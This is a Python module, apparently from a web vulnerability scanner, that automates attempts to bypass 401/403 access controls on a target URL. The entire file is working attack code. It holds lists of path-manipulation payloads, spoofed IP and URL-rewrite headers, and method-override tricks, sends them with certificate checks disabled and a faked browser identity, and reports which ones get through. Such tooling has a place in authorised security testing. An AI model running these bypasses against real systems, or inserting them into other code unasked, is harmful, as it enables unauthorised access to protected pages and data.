"""
Forbidden Bypass Engine — Automated 403/401 bypass techniques.

Applies path manipulation, HTTP method bypass, header injection,
and protocol manipulation to bypass access controls on forbidden URLs.
"""
import logging
from urllib.parse import urlparse, urlunparse, quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

# ── Path manipulation payloads ───────────────────────────────────────────────
# Each entry is a callable that transforms the original path
PATH_MANIPULATIONS = [
    # Trailing slash / dot variations
    lambda p: p + '/',
    lambda p: p + '/.',
    lambda p: p + '/./.',
    lambda p: p + '/..',
    lambda p: p + '/..;/',
    lambda p: '/' + p.lstrip('/') + '%20',
    lambda p: '/' + p.lstrip('/') + '%09',
    lambda p: '/' + p.lstrip('/') + '%00',
    lambda p: '/' + p.lstrip('/') + '%0a',
    lambda p: '/' + p.lstrip('/') + '?',
    lambda p: '/' + p.lstrip('/') + '??',
    lambda p: '/' + p.lstrip('/') + '#',
    lambda p: '/' + p.lstrip('/') + '/*',
    # Leading variations
    lambda p: '//' + p.lstrip('/'),
    lambda p: '/./' + p.lstrip('/'),
    lambda p: '/.;/' + p.lstrip('/'),
    lambda p: '/;/' + p.lstrip('/'),
    # Case manipulation
    lambda p: '/' + p.lstrip('/').upper(),
    lambda p: '/' + p.lstrip('/').capitalize(),
    # Double/triple URL encoding
    lambda p: '/' + quote(p.lstrip('/'), safe=''),
    lambda p: '/' + quote(quote(p.lstrip('/'), safe=''), safe=''),
    # Semicolon/fragment tricks
    lambda p: p + ';',
    lambda p: p + ';.css',
    lambda p: p + ';.js',
    # Backslash (IIS-specific)
    lambda p: p.replace('/', '\\'),
    # Path parameter
    lambda p: p + ';a=b',
    # Overlong UTF-8 dot
    lambda p: p.replace('/', '/%c0%af'),
]

# ── HTTP methods to try ──────────────────────────────────────────────────────
BYPASS_METHODS = [
    'GET', 'POST', 'PUT', 'DELETE', 'PATCH',
    'OPTIONS', 'TRACE', 'HEAD',
]

# ── Method override headers ──────────────────────────────────────────────────
METHOD_OVERRIDE_HEADERS = [
    'X-HTTP-Method-Override',
    'X-Method-Override',
    'X-HTTP-Method',
]

# ── Header-based bypass payloads ─────────────────────────────────────────────
# Each dict is a set of headers to add to the request
BYPASS_HEADERS = [
    # IP spoofing
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Forwarded-For': '10.0.0.1'},
    {'X-Forwarded-For': '0.0.0.0'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'X-Remote-Addr': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'},
    {'Cluster-Client-IP': '127.0.0.1'},
    {'X-ProxyUser-Ip': '127.0.0.1'},
    {'Forwarded': 'for=127.0.0.1'},
    # URL rewrite
    {'X-Original-URL': None},        # placeholder — filled per-request
    {'X-Rewrite-URL': None},         # placeholder — filled per-request
    # Host manipulation
    {'X-Forwarded-Host': 'localhost'},
    {'X-Host': 'localhost'},
    # Referer tricks
    {'Referer': None},               # placeholder — filled per-request
]

# ── Protocol headers ─────────────────────────────────────────────────────────
PROTOCOL_HEADERS = [
    {'X-Forwarded-Proto': 'https'},
    {'X-Forwarded-Scheme': 'https'},
    {'X-Forwarded-Port': '443'},
    {'X-Forwarded-Port': '80'},
    {'Connection': 'keep-alive'},
]

# Status codes that indicate the original request was blocked
BLOCKED_STATUS_CODES = {401, 403, 405}

# Status codes that indicate a successful bypass
SUCCESS_STATUS_CODES = {200, 201, 202, 204, 301, 302}

# Minimum body length to consider a bypass response real (not an error page)
MIN_BYPASS_BODY_LENGTH = 50

# Speed budget — max bypass attempts per depth
MAX_ATTEMPTS = {
    'shallow': 20,
    'medium': 60,
    'deep': 200,
}


class ForbiddenBypassEngine:
    """
    Engine for bypassing 403 Forbidden and 401 Unauthorized responses.

    Usage:
        engine = ForbiddenBypassEngine()
        results = engine.run(url, original_status_code=403, depth='medium')

    Returns a list of successful bypass dicts.
    """

    REQUEST_TIMEOUT = 8

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36',
        })
        self.session.verify = False

    def run(
        self,
        url: str,
        original_status_code: int = 403,
        depth: str = 'medium',
    ) -> list:
        """
        Attempt to bypass a 403/401 on the given URL.

        Args:
            url: The URL returning 403/401.
            original_status_code: The status code to bypass (403 or 401).
            depth: 'shallow', 'medium', or 'deep'.

        Returns:
            List of dicts describing successful bypasses, each with:
                technique, variant, status_code, body_length, url, evidence.
        """
        if original_status_code not in BLOCKED_STATUS_CODES:
            return []

        parsed = urlparse(url)
        path = parsed.path or '/'
        budget = MAX_ATTEMPTS.get(depth, 60)
        results = []
        attempt_count = 0

        # 1. Path manipulation
        results, attempt_count = self._try_path_manipulations(
            url, parsed, path, original_status_code, results, attempt_count, budget,
        )

        # 2. HTTP method bypass
        if attempt_count < budget:
            results, attempt_count = self._try_method_bypass(
                url, path, original_status_code, results, attempt_count, budget,
            )

        # 3. Header bypass
        if attempt_count < budget:
            results, attempt_count = self._try_header_bypass(
                url, parsed, path, original_status_code, results, attempt_count, budget,
            )

        # 4. Protocol manipulation (deep only)
        if depth == 'deep' and attempt_count < budget:
            results, attempt_count = self._try_protocol_bypass(
                url, original_status_code, results, attempt_count, budget,
            )

        # 5. Method override headers (medium+)
        if depth in ('medium', 'deep') and attempt_count < budget:
            results, attempt_count = self._try_method_override(
                url, path, original_status_code, results, attempt_count, budget,
            )

        return results

    # ── Internal bypass techniques ───────────────────────────────────────────

    def _try_path_manipulations(
        self, url, parsed, path, orig_status, results, attempts, budget,
    ):
        """Try path manipulation bypasses."""
        for manipulate in PATH_MANIPULATIONS:
            if attempts >= budget:
                break
            try:
                new_path = manipulate(path)
                test_url = urlunparse(parsed._replace(path=new_path))
                resp = self._make_request('GET', test_url)
                attempts += 1
                if self._is_bypass(resp, orig_status):
                    results.append(self._build_result(
                        technique='path_manipulation',
                        variant=new_path,
                        resp=resp,
                        url=test_url,
                    ))
            except Exception:
                attempts += 1
                continue
        return results, attempts

    def _try_method_bypass(
        self, url, path, orig_status, results, attempts, budget,
    ):
        """Try different HTTP methods."""
        for method in BYPASS_METHODS:
            if attempts >= budget:
                break
            if method == 'GET':
                continue  # Skip — that's the original
            try:
                resp = self._make_request(method, url)
                attempts += 1
                if self._is_bypass(resp, orig_status):
                    results.append(self._build_result(
                        technique='method_bypass',
                        variant=method,
                        resp=resp,
                        url=url,
                    ))
            except Exception:
                attempts += 1
                continue
        return results, attempts

    def _try_header_bypass(
        self, url, parsed, path, orig_status, results, attempts, budget,
    ):
        """Try header-based bypasses."""
        base_url = f'{parsed.scheme}://{parsed.netloc}'

        for header_set in BYPASS_HEADERS:
            if attempts >= budget:
                break
            try:
                # Fill in placeholders
                headers = {}
                for k, v in header_set.items():
                    if k == 'X-Original-URL' and v is None:
                        headers[k] = path
                    elif k == 'X-Rewrite-URL' and v is None:
                        headers[k] = path
                    elif k == 'Referer' and v is None:
                        headers[k] = f'{base_url}/admin'
                    else:
                        headers[k] = v

                resp = self._make_request('GET', url, headers=headers)
                attempts += 1
                if self._is_bypass(resp, orig_status):
                    header_desc = ', '.join(f'{k}: {v}' for k, v in headers.items())
                    results.append(self._build_result(
                        technique='header_bypass',
                        variant=header_desc,
                        resp=resp,
                        url=url,
                    ))
            except Exception:
                attempts += 1
                continue
        return results, attempts

    def _try_protocol_bypass(
        self, url, orig_status, results, attempts, budget,
    ):
        """Try protocol manipulation headers."""
        for header_set in PROTOCOL_HEADERS:
            if attempts >= budget:
                break
            try:
                resp = self._make_request('GET', url, headers=header_set)
                attempts += 1
                if self._is_bypass(resp, orig_status):
                    header_desc = ', '.join(f'{k}: {v}' for k, v in header_set.items())
                    results.append(self._build_result(
                        technique='protocol_bypass',
                        variant=header_desc,
                        resp=resp,
                        url=url,
                    ))
            except Exception:
                attempts += 1
                continue
        return results, attempts

    def _try_method_override(
        self, url, path, orig_status, results, attempts, budget,
    ):
        """Try method override headers to change the server-side method."""
        for override_header in METHOD_OVERRIDE_HEADERS:
            if attempts >= budget:
                break
            try:
                headers = {override_header: 'GET'}
                resp = self._make_request('POST', url, headers=headers)
                attempts += 1
                if self._is_bypass(resp, orig_status):
                    results.append(self._build_result(
                        technique='method_override',
                        variant=f'POST with {override_header}: GET',
                        resp=resp,
                        url=url,
                    ))
            except Exception:
                attempts += 1
                continue

        # Also try _method parameter in body
        if attempts < budget:
            try:
                resp = self._make_request(
                    'POST', url, data={'_method': 'GET'},
                )
                attempts += 1
                if self._is_bypass(resp, orig_status):
                    results.append(self._build_result(
                        technique='method_override',
                        variant='POST with _method=GET body param',
                        resp=resp,
                        url=url,
                    ))
            except Exception:
                attempts += 1

        return results, attempts

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _make_request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make a single HTTP request with timeout and error handling."""
        kwargs.setdefault('timeout', self.REQUEST_TIMEOUT)
        kwargs.setdefault('allow_redirects', False)
        try:
            return self.session.request(method, url, **kwargs)
        except Exception as exc:
            logger.debug('Bypass request failed: %s %s — %s', method, url, exc)
            return None

    def _is_bypass(self, resp, original_status: int) -> bool:
        """Determine if the response indicates a successful bypass."""
        if resp is None:
            return False
        # Must be a different (success-category) status than the original
        if resp.status_code in SUCCESS_STATUS_CODES and resp.status_code != original_status:
            body = getattr(resp, 'text', '') or ''
            # Filter out trivial/empty responses
            if len(body) >= MIN_BYPASS_BODY_LENGTH:
                return True
        return False

    @staticmethod
    def _build_result(technique: str, variant: str, resp, url: str) -> dict:
        """Build a bypass result dict."""
        body = getattr(resp, 'text', '') or ''
        return {
            'technique': technique,
            'variant': variant,
            'status_code': resp.status_code,
            'body_length': len(body),
            'url': url,
            'evidence': f'{technique}: {variant} → HTTP {resp.status_code} ({len(body)} bytes)',
        }
